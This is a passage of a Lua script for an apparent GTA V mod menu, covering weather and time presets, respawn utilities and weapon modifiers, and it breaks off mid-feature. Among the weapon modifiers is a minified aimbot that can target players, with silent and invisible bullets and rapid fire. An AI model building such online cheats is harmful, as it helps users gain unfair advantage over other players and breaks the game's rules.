feature["Bouncy Water"] = menu.add_feature("Bouncy Water", "value_i", localparents["World"].id, function(f)
	while f.on do
		if player.is_player_in_any_vehicle(player.player_id()) then
			if entity.is_entity_in_water(player.get_player_vehicle(player.player_id())) then
				entity.set_entity_velocity(player.get_player_vehicle(player.player_id()), v3(entity.get_entity_velocity(player.get_player_vehicle(player.player_id())).x, entity.get_entity_velocity(player.get_player_vehicle(player.player_id())).y, tonumber(feature["Bouncy Water"].value)))
			end
		else
			if entity.is_entity_in_water(player.get_player_ped(player.player_id())) then
				entity.set_entity_velocity(player.get_player_ped(player.player_id()), v3(entity.get_entity_velocity(player.get_player_ped(player.player_id())).x, entity.get_entity_velocity(player.get_player_ped(player.player_id())).y, tonumber(feature["Bouncy Water"].value)))
			end
		end
		system.yield(0)
	end
end)
feature["Bouncy Water"].max = 50
feature["Bouncy Water"].min = 1
feature["Bouncy Water"].mod = 1
feature["Bouncy Water"].value = 15

localparents["Weather And Time"] = menu.add_feature("Weather And Time", "parent", localparents["World"].id)

feature["Local Time"] = menu.add_feature("Local Time", "toggle", localparents["Weather And Time"].id, function(f)
	while f.on do
		system.yield(0)
		time.set_clock_time(tonumber(os.date("*t").hour), tonumber(os.date("*t").min), tonumber(os.date("*t").sec))
	end
end)

localparents["Presets"] = menu.add_feature("Presets", "parent", localparents["Weather And Time"].id)

feature["Idyllic"] = menu.add_feature("Idyllic", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 6
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 4
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 0
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Idyllic 2"] = menu.add_feature("Idyllic 2", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 19
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 4
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 4
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Horizon"] = menu.add_feature("Horizon", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 20
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 1
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 6
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Horizon 2"] = menu.add_feature("Horizon 2", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 20
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 30
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 0
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 8
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Galaxy"] = menu.add_feature("Galaxy", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 22
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 5
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 10
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Morning Hour"] = menu.add_feature("Morning Hour", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 6
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 2
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 8
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Point Midnight"] = menu.add_feature("Point Midnight", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 0
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 5
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 14
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Thunderstorm"] = menu.add_feature("Thunderstorm", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 20
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 50
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 7
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 15
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 1.0
	feature["Set Rain Level"]:toggle()
	feature["Set Wind Speed"].value = 1.0
	feature["Set Wind Speed"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Thick Fog"] = menu.add_feature("Thick Fog", "action", localparents["Presets"].id, function(f)
	feature["Local Time"].on = false
	feature["Freeze Time"].on = false
	feature["Override Hour"].value = 5
	feature["Override Hour"].on = true
	feature["Override Minute"].value = 0
	feature["Override Minute"].on = true
	feature["Override Second"].value = 0
	feature["Override Second"].on = true
	feature["Time Cycle"].on = false
	feature["Override Weather"].value = 4
	feature["Override Weather"].on = true
	feature["Override Cloud Hat"].value = 13
	feature["Override Cloud Hat"].on = true
	feature["Set Rain Level"].value = 0.0
	feature["Set Rain Level"]:toggle()
	feature["Set Wind Speed"].value = 0.0
	feature["Set Wind Speed"]:toggle()
	feature["Set Snow Level"].value = 0.0
	feature["Set Snow Level"]:toggle()
end)

feature["Freeze Time"] = menu.add_feature("Freeze Time", "toggle", localparents["Weather And Time"].id, function(f)
	if f.on then
		local seconds = time.get_clock_seconds()
		local minutes = time.get_clock_minutes()
		local hours = time.get_clock_hours()
		while f.on do
			system.yield(0)
			time.set_clock_time(hours, minutes, seconds)
		end
	end
end)

feature["Override Hour"] = menu.add_feature("Override Hour", "value_i", localparents["Weather And Time"].id, function(f)
	while f.on do
		system.yield(0)
		time.set_clock_time(f.value, time.get_clock_minutes(), time.get_clock_seconds())
	end
end)
feature["Override Hour"].max = 23
feature["Override Hour"].min = 0
feature["Override Hour"].mod = 1
feature["Override Hour"].value = 0

feature["Set Hour"] = menu.add_feature("Set Hour", "action_value_i", localparents["Weather And Time"].id, function(f)
	time.set_clock_time(f.value, time.get_clock_minutes(), time.get_clock_seconds())
end)
feature["Set Hour"].max = 23
feature["Set Hour"].min = 0
feature["Set Hour"].mod = 1
feature["Set Hour"].value = 0

feature["Override Minute"] = menu.add_feature("Override Minute", "value_i", localparents["Weather And Time"].id, function(f)
	while f.on do
		system.yield(0)
		time.set_clock_time(time.get_clock_hours(), f.value, time.get_clock_seconds())
	end
end)
feature["Override Minute"].max = 55
feature["Override Minute"].min = 0
feature["Override Minute"].mod = 5
feature["Override Minute"].value = 0

feature["Set Minute"] = menu.add_feature("Set Minute", "action_value_i", localparents["Weather And Time"].id, function(f)
	time.set_clock_time(time.get_clock_hours(), f.value, time.get_clock_seconds())
end)
feature["Set Minute"].max = 55
feature["Set Minute"].min = 0
feature["Set Minute"].mod = 5
feature["Set Minute"].value = 0

feature["Override Second"] = menu.add_feature("Override Second", "value_i", localparents["Weather And Time"].id, function(f)
	while f.on do
		system.yield(0)
		time.set_clock_time(time.get_clock_hours(), time.get_clock_minutes(), f.value)
	end
end)
feature["Override Second"].max = 55
feature["Override Second"].min = 0
feature["Override Second"].mod = 5
feature["Override Second"].value = 0

feature["Set Second"] = menu.add_feature("Set Second", "action_value_i", localparents["Weather And Time"].id, function(f)
	time.set_clock_time(time.get_clock_hours(), time.get_clock_minutes(), f.value)
end)
feature["Set Second"].max = 55
feature["Set Second"].min = 0
feature["Set Second"].mod = 5
feature["Set Second"].value = 0

feature["Time Cycle"] = menu.add_feature("Time Cycle", "value_i", localparents["Weather And Time"].id, function(f)
	if f.on then
		for a = time.get_clock_hours(), 23 do
			for b = time.get_clock_minutes(), 63 do
				if f.on then
					time.set_clock_time(a, b, 0)
					system.yield(math.tointeger(f.value))
				end
			end
			system.yield(math.tointeger(f.value))
		end
		while f.on do
			system.yield(0)
			for a = 0, 23 do
				for b = 0, 63 do
					if f.on then
						time.set_clock_time(a, b, 0)
						system.yield(math.tointeger(f.value))
					end
				end
				system.yield(math.tointeger(f.value))
			end
		end
	end
end)
feature["Time Cycle"].max = 100
feature["Time Cycle"].min = 0
feature["Time Cycle"].mod = 1
feature["Time Cycle"].value = 0

feature["Override Weather"] = menu.add_feature("Override Weather", "value_str", localparents["Weather And Time"].id, function(f)
	if f.on then
		while f.on do
			system.yield(0)
			gameplay.set_override_weather(f.value)
		end
	end
end)
feature["Override Weather"]:set_str_data({"EXTRASUNNY", "CLEAR", "CLOUDS", "SMOG", "FOGGY", "OVERCAST", "RAIN", "THUNDER", "CLEARING", "NEUTRAL", "SNOW", "BLIZZARD", "SNOWLIGHT", "XMAS", "HALLOWEEN"})

feature["Change Weather"] = menu.add_feature("Change Weather", "action_value_str", localparents["Weather And Time"].id, function(f)
	system.yield(0)
	gameplay.set_override_weather(f.value)
end)
feature["Change Weather"]:set_str_data({"EXTRASUNNY", "CLEAR", "CLOUDS", "SMOG", "FOGGY", "OVERCAST", "RAIN", "THUNDER", "CLEARING", "NEUTRAL", "SNOW", "BLIZZARD", "SNOWLIGHT", "XMAS", "HALLOWEEN"})

feature["Clear Weather"] = menu.add_feature("Clear Weather", "action", localparents["Weather And Time"].id, function(f)
	gameplay.clear_override_weather()
end)

feature["Override Cloud Hat"] = menu.add_feature("Override Cloud Hat", "value_str", localparents["Weather And Time"].id, function(f)
	if f.on then
		while f.on do
			system.yield(0)
			local cloud_hat
			if f.value == 0 then
				cloud_hat = "altostratus"
			elseif f.value == 1 then
				cloud_hat = "Cirrus"
			elseif f.value == 2 then
				cloud_hat = "cirrocumulus"
			elseif f.value == 3 then
				cloud_hat = "Clear 01"
			elseif f.value == 4 then
				cloud_hat = "Cloudy 01"
			elseif f.value == 5 then
				cloud_hat = "Contrails"
			elseif f.value == 6 then
				cloud_hat = "Horizon"
			elseif f.value == 7 then
				cloud_hat = "horizonband1"
			elseif f.value == 8 then
				cloud_hat = "horizonband2"
			elseif f.value == 9 then
				cloud_hat = "horizonband3"
			elseif f.value == 10 then
				cloud_hat = "horsey"
			elseif f.value == 11 then
				cloud_hat = "Nimbus"
			elseif f.value == 12 then
				cloud_hat = "Puffs"
			elseif f.value == 13 then
				cloud_hat = "RAIN"
			elseif f.value == 14 then
				cloud_hat = "Snowy 01"
			elseif f.value == 15 then
				cloud_hat = "Stormy 01"
			elseif f.value == 16 then
				cloud_hat = "stratoscumulus"
			elseif f.value == 17 then
				cloud_hat = "Stripey"
			elseif f.value == 18 then
				cloud_hat = "shower"
			else
				cloud_hat = "Wispy"
			end
			gameplay.load_cloud_hat(cloud_hat, 0)
		end
	end
end)
feature["Override Cloud Hat"]:set_str_data({"altostratus", "Cirrus", "cirrocumulus", "Clear 01", "Cloudy 01", "Contrails", "Horizon", "horizonband1", "horizonband2", "horizonband3", "horsey", "Nimbus", "Puffs", "RAIN", "Snowy 01", "Stormy 01", "stratoscumulus", "Stripey", "shower", "Wispy"})

feature["Change Cloud Hat"] = menu.add_feature("Change Cloud Hat", "action_value_str", localparents["Weather And Time"].id, function(f)
	local cloud_hat
	if f.value == 0 then
		cloud_hat = "altostratus"
	elseif f.value == 1 then
		cloud_hat = "Cirrus"
	elseif f.value == 2 then
		cloud_hat = "cirrocumulus"
	elseif f.value == 3 then
		cloud_hat = "Clear 01"
	elseif f.value == 4 then
		cloud_hat = "Cloudy 01"
	elseif f.value == 5 then
		cloud_hat = "Contrails"
	elseif f.value == 6 then
		cloud_hat = "Horizon"
	elseif f.value == 7 then
		cloud_hat = "horizonband1"
	elseif f.value == 8 then
		cloud_hat = "horizonband2"
	elseif f.value == 9 then
		cloud_hat = "horizonband3"
	elseif f.value == 10 then
		cloud_hat = "horsey"
	elseif f.value == 11 then
		cloud_hat = "Nimbus"
	elseif f.value == 12 then
		cloud_hat = "Puffs"
	elseif f.value == 13 then
		cloud_hat = "RAIN"
	elseif f.value == 14 then
		cloud_hat = "Snowy 01"
	elseif f.value == 15 then
		cloud_hat = "Stormy 01"
	elseif f.value == 16 then
		cloud_hat = "stratoscumulus"
	elseif f.value == 17 then
		cloud_hat = "Stripey"
	elseif f.value == 18 then
		cloud_hat = "shower"
	else
		cloud_hat = "Wispy"
	end
	gameplay.load_cloud_hat(cloud_hat, 0)
end)
feature["Change Cloud Hat"]:set_str_data({"altostratus", "Cirrus", "cirrocumulus", "Clear 01", "Cloudy 01", "Contrails", "Horizon", "horizonband1", "horizonband2", "horizonband3", "horsey", "Nimbus", "Puffs", "RAIN", "Snowy 01", "Stormy 01", "stratoscumulus", "Stripey", "shower", "Wispy"})

feature["Clear Cloud Hat"] = menu.add_feature("Clear Cloud Hat", "action", localparents["Weather And Time"].id, function(f)
	gameplay.clear_cloud_hat()
end)

feature["Waves Intensity"] = menu.add_feature("Waves Intensity", "action_value_str", localparents["Weather And Time"].id, function(f)
	if f.value == 0 then
		local input_stat, input_val = input.get("Set Waves Intensity (0 - 1000)", "", 4, 3)
		if input_stat == 1 then
			return HANDLER_CONTINUE
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		if tonumber(input_val) < 0 or tonumber(input_val) > 1000 then
			menu.notify("Invalid Input!", AddictScript, 3, NotifyColours["red"])
		else
			water.set_waves_intensity(tonumber(input_val))
		end
	elseif f.value == 1 then
		water.reset_waves_intensity()
	end
end):set_str_data({
	"Set",
	"Reset"
})

feature["Set Wind Speed"] = menu.add_feature("Set Wind Speed", "action_value_f", localparents["Weather And Time"].id, function(f)
	natives.SET_WIND(f.value)
end)
feature["Set Wind Speed"].max = 1.0
feature["Set Wind Speed"].min = 0.0
feature["Set Wind Speed"].mod = 0.1
feature["Set Wind Speed"].value = 0.0

feature["Set Rain Level"] = menu.add_feature("Set Rain Level", "action_value_f", localparents["Weather And Time"].id, function(f)
	natives.SET_RAIN_LEVEL(f.value)
end)
feature["Set Rain Level"].max = 1.0
feature["Set Rain Level"].min = 0.0
feature["Set Rain Level"].mod = 0.1
feature["Set Rain Level"].value = 0.0

feature["Reset Rain Level"] = menu.add_feature("Reset Rain Level", "action", localparents["Weather And Time"].id, function(f)
	natives.SET_RAIN_LEVEL(-1.0)
end)

feature["Set Snow Level"] = menu.add_feature("Set Snow Level", "action_value_f", localparents["Weather And Time"].id, function(f)
	natives.SET_SNOW_LEVEL(f.value)
end)
feature["Set Snow Level"].max = 1.0
feature["Set Snow Level"].min = 0.0
feature["Set Snow Level"].mod = 0.1
feature["Set Snow Level"].value = 0.0

feature["Create Lightning Flash"] = menu.add_feature("Create Lightning Flash", "action", localparents["Weather And Time"].id, function(f)
	natives.FORCE_LIGHTNING_FLASH()
end)

localparents["Utilities"] = menu.add_feature("Utilities", "parent", localparents["Local"].id)

feature["Remove Player Target Restrictions"] = menu.add_feature("Remove Player Target Restrictions", "toggle", localparents["Utilities"].id, function(f)
	if f.on then
		utilities.request_model(gameplay.get_hash_key("csb_juanstrickler"))
		utilities.request_model(gameplay.get_hash_key("bati"))
		while f.on do
			system.yield(0)
			for pid = 0, 31 do
				if player.player_id() ~= pid then
					if player.is_player_valid(pid) then
						if meteor_entities["Player Target Ped " .. pid] == nil and meteor_entities["Player Target Vehicle " .. pid] == nil then
							streaming.request_model(gameplay.get_hash_key("csb_juanstrickler"))
							streaming.request_model(gameplay.get_hash_key("bati"))
							meteor_entities["Player Target Ped " .. pid] = ped.create_ped(4, gameplay.get_hash_key("csb_juanstrickler"), player.get_player_coords(pid), 0, false, true)
							meteor_entities["Player Target Vehicle " .. pid] = vehicle.create_vehicle(gameplay.get_hash_key("bati"), player.get_player_coords(pid), 0, false, true)
							entity.set_entity_as_mission_entity(meteor_entities["Player Target Ped " .. pid], true, true)
							entity.set_entity_as_mission_entity(meteor_entities["Player Target Vehicle " .. pid], true, true)
							ped.set_ped_combat_ability(meteor_entities["Player Target Ped " .. pid], 0)
							ped.set_ped_combat_attributes(meteor_entities["Player Target Ped " .. pid], 5, true)
							ped.set_ped_combat_attributes(meteor_entities["Player Target Ped " .. pid], 3, false)
							entity.freeze_entity(meteor_entities["Player Target Ped " .. pid])
							entity.freeze_entity(meteor_entities["Player Target Vehicle " .. pid])
						end
						if meteor_entities["Player Target Ped " .. pid] ~= nil and meteor_entities["Player Target Vehicle " .. pid] ~= nil then
							natives.CLEAR_PED_TASKS(meteor_entities["Player Target Ped " .. pid])
							natives.CLEAR_PED_SECONDARY_TASK(meteor_entities["Player Target Ped " .. pid])
							entity.set_entity_god_mode(meteor_entities["Player Target Ped " .. pid], true)
							entity.set_entity_god_mode(meteor_entities["Player Target Vehicle " .. pid], true)
							entity.set_entity_alpha(meteor_entities["Player Target Ped " .. pid], 0, true)
							entity.set_entity_alpha(meteor_entities["Player Target Vehicle " .. pid], 0, true)
							ped.set_ped_into_vehicle(meteor_entities["Player Target Ped " .. pid], meteor_entities["Player Target Vehicle " .. pid], -1)
							entity.set_entity_collision(meteor_entities["Player Target Ped " .. pid], false, false, false)
							entity.set_entity_collision(meteor_entities["Player Target Vehicle " .. pid], false, false, false)
							entity.set_entity_coords_no_offset(meteor_entities["Player Target Vehicle " .. pid], player.get_player_coords(pid))
						end
					else
						if meteor_entities["Player Target Ped " .. pid] ~= nil and meteor_entities["Player Target Vehicle " .. pid] ~= nil then
							entity.delete_entity(meteor_entities["Player Target Ped " .. pid])
							entity.delete_entity(meteor_entities["Player Target Vehicle " .. pid])
							meteor_entities["Player Target Ped " .. pid] = nil
							meteor_entities["Player Target Vehicle " .. pid] = nil
						end
					end
				end
			end
		end
	end
	if not f.on then
		for i = 0, 31 do
			if meteor_entities["Player Target Ped " .. i] ~= nil and meteor_entities["Player Target Vehicle " .. i] ~= nil then
				entity.delete_entity(meteor_entities["Player Target Ped " .. i])
				entity.delete_entity(meteor_entities["Player Target Vehicle " .. i])
				meteor_entities["Player Target Ped " .. i] = nil
				meteor_entities["Player Target Vehicle " .. i] = nil
			end
		end
	end
end)

feature["Instant Respawn"] = menu.add_feature("Instant Respawn", "toggle", localparents["Utilities"].id, function(f)
	while f.on do
		if network.is_session_started() then
			if entity.is_entity_dead(player.get_player_ped(player.player_id())) then
				local success, respawn_point = gameplay.find_spawn_point_in_direction(player.get_player_coords(player.player_id()), entity.get_entity_forward_vector(player.get_player_ped(player.player_id())), math.random(200.0, 400.0))
				if success and respawn_point ~= nil then
					natives.NETWORK_RESURRECT_LOCAL_PLAYER(respawn_point, player.get_player_heading(player.player_id()), false, false, 0, 0, 0)
					system.yield(100)
				end
			end
		end
		system.yield(0)
	end
end)

feature["Respawn On Death Coords"] = menu.add_feature("Respawn On Death Coords", "toggle", localparents["Utilities"].id, function(f)
	local DeathCoords = nil
	while f.on do
		if network.is_session_started() then
			if entity.is_entity_dead(player.get_player_ped(player.player_id())) then
				DeathCoords = player.get_player_coords(player.player_id())
			end
			if not entity.is_entity_dead(player.get_player_ped(player.player_id())) and DeathCoords then
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), DeathCoords)
				DeathCoords = nil
			end
		end
		system.yield(0)
	end
end)

localparents["Weapon Modifiers"] = menu.add_feature("Weapon Modifiers", "parent", localparents["Local"].id)

localparents["aimbot"]=menu.add_feature("AimBot","parent",localparents["Weapon Modifiers"].id)local a=false;local b=true;feature["aimboth"]=menu.add_feature("Targeting Filter","autoaction_value_str",localparents["aimbot"].id,function(c)end)feature["aimboth"]:set_str_data({"Off","Peds Only","Players Only"})feature["aimbotD"]=menu.add_feature("Bullet Damage","autoaction_value_i",localparents["aimbot"].id,function(c)end)feature["aimbotD"].min=1000;feature["aimbotD"].max=50000;feature["aimbotD"].value=10000;feature["aimbotD"].mod=1000;feature["aimbotS"]=menu.add_feature("Bullet Speed","autoaction_value_i",localparents["aimbot"].id,function(c)end)feature["aimbotS"].min=10;feature["aimbotS"].max=1000;feature["aimbotS"].value=10;feature["aimbotS"].mod=10;feature["aimbotT"]=menu.add_feature("Bullet Delay (ms)","autoaction_value_i",localparents["aimbot"].id,function(c)end)feature["aimbotT"].min=0;feature["aimbotT"].max=1000;feature["aimbotT"].value=0;feature["aimbotT"].mod=10;feature["Silent Bullets"]=menu.add_feature("Silent Bullets","toggle",localparents["aimbot"].id,function(c)if c.on then a=true else a=false end;return HANDLER_CONTINUE end)feature["Invisible Bullets"]=menu.add_feature("Invisible Bullets","toggle",localparents["aimbot"].id,function(c)if c.on then b=false else b=true end;return HANDLER_CONTINUE end)feature["AimBotJ"]=menu.add_feature("Enable","value_str",localparents["aimbot"].id,function(c)myaim=entity.get_entity_coords(player.get_entity_player_is_aiming_at(player.player_id()))deathcheck=entity.is_entity_dead(player.get_player_ped(player.player_id()))if c.on and c.value==0 and player.is_player_free_aiming(player.player_id())and not deathcheck then ped_table=ped.get_all_peds()pedcount=#ped_table;while pedcount==0 do ped_table=ped.get_all_peds()pedcount=#ped_table end;ped_table_result={}for d=1,#ped_table do if feature["aimboth"].value==0 then ped_table_result[d]=ped_table[d]end;if feature["aimboth"].value==1 then if not ped.is_ped_a_player(ped_table[d])then ped_table_result[#ped_table_result+1]=ped_table[d]end end;if feature["aimboth"].value==2 then if ped.is_ped_a_player(ped_table[d])then ped_table_result[#ped_table_result+1]=ped_table[d]end end end;pedcount=#ped_table_result;for d=1,pedcount do while ped_table_result[d]==nil do d=d+1 end;while entity.is_entity_dead(ped_table_result[d])and d<pedcount do d=d+1 end;deadbool,pedcoords=ped.get_ped_bone_coords(ped_table_result[d],37193,v3(0,0,0))origincoord=pedcoords;system.wait(2)for e=0,1 do gameplay.shoot_single_bullet_between_coords(v3(origincoord.x+0.02,origincoord.y,origincoord.z),v3(pedcoords.x,pedcoords.y,pedcoords.z),feature["aimbotD"].value,ped.get_current_ped_weapon(player.get_player_ped(player.player_id())),player.get_player_ped(player.player_id()),a,b,feature["aimbotS"].value)gameplay.shoot_single_bullet_between_coords(v3(origincoord.x,origincoord.y+0.02,origincoord.z),v3(pedcoords.x,pedcoords.y,pedcoords.z),feature["aimbotD"].value,ped.get_current_ped_weapon(player.get_player_ped(player.player_id())),player.get_player_ped(player.player_id()),a,b,feature["aimbotS"].value)gameplay.shoot_single_bullet_between_coords(v3(origincoord.x,origincoord.y,origincoord.z+0.02),v3(pedcoords.x,pedcoords.y,pedcoords.z),feature["aimbotD"].value,ped.get_current_ped_weapon(player.get_player_ped(player.player_id())),player.get_player_ped(player.player_id()),a,b,feature["aimbotS"].value)end end end;if c.on and c.value==1 and player.get_entity_player_is_aiming_at(player.player_id())~=0 and not deathcheck then gameplay.shoot_single_bullet_between_coords(v3(myaim.x,myaim.y,myaim.z),v3(myaim.x+0.02,myaim.y,myaim.z+0.2),feature["aimbotD"].value,ped.get_current_ped_weapon(player.get_player_ped(player.player_id())),player.get_player_ped(player.player_id()),a,b,aimbotS.value)end;return HANDLER_CONTINUE end)feature["AimBotJ"]:set_str_data({"Silent Aim","Manual Aim"})feature["aimbotN"]=menu.add_feature("Targeting Manager","value_i",localparents["aimbot"].id,function(c)if feature["AimBotJ"].value==0 then feature["aimboth"].hidden=false end;system.wait(5)if feature["AimBotJ"].value==1 then feature["aimboth"].hidden=true end;system.wait(5)return HANDLER_CONTINUE end)feature["aimbotN"].on=true;feature["aimbotN"].hidden=true

feature["Rapid Fire"] = menu.add_feature("Rapid Fire", "slider", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		if not player.is_player_in_any_vehicle(player.player_id()) then
			local current_weapon = ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
			if ped.is_ped_shooting(player.get_player_ped(player.player_id())) or (controls.is_disabled_control_pressed(0, 24) and (current_weapon == 615608432 or current_weapon == 2694266206 or current_weapon == 4256991824 or current_weapon == 3125143736 or current_weapon == 2874559379 or current_weapon == 741814745 or current_weapon == 2481070269 or current_weapon == 1233104067 or current_weapon == 126349499 or current_weapon == 600439132)) then
				while controls.is_disabled_control_pressed(0, 24) and current_weapon == ped.get_current_ped_weapon(player.get_player_ped(player.player_id())) and not player.is_player_in_any_vehicle(player.player_id()) and not natives.IS_PAUSE_MENU_ACTIVE() and not script_func.is_phone_open() and not ped.is_ped_ragdoll(player.get_player_ped(player.player_id())) do
					system.yield(math.tointeger(f.value))
					local v3_start, v3_end = utilities.get_current_shooting_direction()
					gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, current_weapon, player.get_player_ped(player.player_id()), true, false, 1000)
				end
			end
		end
		system.yield(0)
	end
end)
feature["Rapid Fire"].max = 250
feature["Rapid Fire"].min = 0
feature["Rapid Fire"].mod = 10
feature["Rapid Fire"].value = 0

feature["Vehicle Rapid Fire"] = menu.add_feature("Vehicle Rapid Fire", "slider", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		if player.is_player_in_any_vehicle(player.player_id()) then
			local success, current_weapon = natives.GET_CURRENT_PED_VEHICLE_WEAPON(player.get_player_ped(player.player_id()))
			if success and current_weapon ~= 0 then
				if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
					while controls.is_disabled_control_pressed(0, 70) and current_weapon == select(2, natives.GET_CURRENT_PED_VEHICLE_WEAPON(player.get_player_ped(player.player_id()))) and player.is_player_in_any_vehicle(player.player_id()) and not natives.IS_PAUSE_MENU_ACTIVE() and not script_func.is_phone_open() and not ped.is_ped_ragdoll(player.get_player_ped(player.player_id())) do
						system.yield(math.tointeger(f.value))
						local v3_start, v3_end = utilities.get_current_vehicle_shooting_direction()
						gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, current_weapon, player.get_player_ped(player.player_id()), true, false, 1000)
					end
				end
			end
		end
		system.yield(0)
	end
end)
feature["Vehicle Rapid Fire"].max = 250
feature["Vehicle Rapid Fire"].min = 0
feature["Vehicle Rapid Fire"].mod = 10
feature["Vehicle Rapid Fire"].value = 0

feature["Melee Knockback"] = menu.add_feature("Melee Knockback", "slider", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		local ped_weapon = ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
		if (ped_weapon == gameplay.get_hash_key("weapon_unarmed") or ped_weapon == gameplay.get_hash_key("weapon_bat") or ped_weapon == gameplay.get_hash_key("weapon_wrench") or ped_weapon == gameplay.get_hash_key("weapon_bottle") or ped_weapon == gameplay.get_hash_key("weapon_crowbar") or ped_weapon == gameplay.get_hash_key("weapon_hammer") or ped_weapon == gameplay.get_hash_key("weapon_nightstick") or ped_weapon == gameplay.get_hash_key("weapon_knuckle") or ped_weapon == gameplay.get_hash_key("weapon_machete") or ped_weapon == gameplay.get_hash_key("weapon_poolcue")) and not player.is_player_in_any_vehicle(player.player_id()) then
			local melee_target = natives.GET_MELEE_TARGET_FOR_PED(player.get_player_ped(player.player_id()))
			if natives.IS_PED_IN_MELEE_COMBAT(player.get_player_ped(player.player_id())) and melee_target ~= 0 and not natives.IS_PED_PERFORMING_STEALTH_KILL(player.get_player_ped(player.player_id())) then
				if not ped.is_ped_a_player(melee_target) then
					if entity.has_entity_been_damaged_by_entity(melee_target, player.get_player_ped(player.player_id())) and natives.GET_COLLISION_NORMAL_OF_LAST_HIT_FOR_ENTITY(melee_target) ~= v3(0.0, 0.0, 0.0) then
						network.request_control_of_entity(melee_target)
						entity.set_entity_velocity(melee_target, (entity.get_entity_coords(melee_target) - player.get_player_coords(player.player_id())) * (f.value / utilities.get_distance_between(melee_target, player.get_player_coords(player.player_id()))))
						system.yield(100)
					end
				end
			end
		end
		system.yield(0)
	end
end)
feature["Melee Knockback"].max = 500
feature["Melee Knockback"].min = 0
feature["Melee Knockback"].mod = 10
feature["Melee Knockback"].value = 0

feature["Flamethrower"] = menu.add_feature("Flamethrower", "slider", localparents["Weapon Modifiers"].id, function(f)
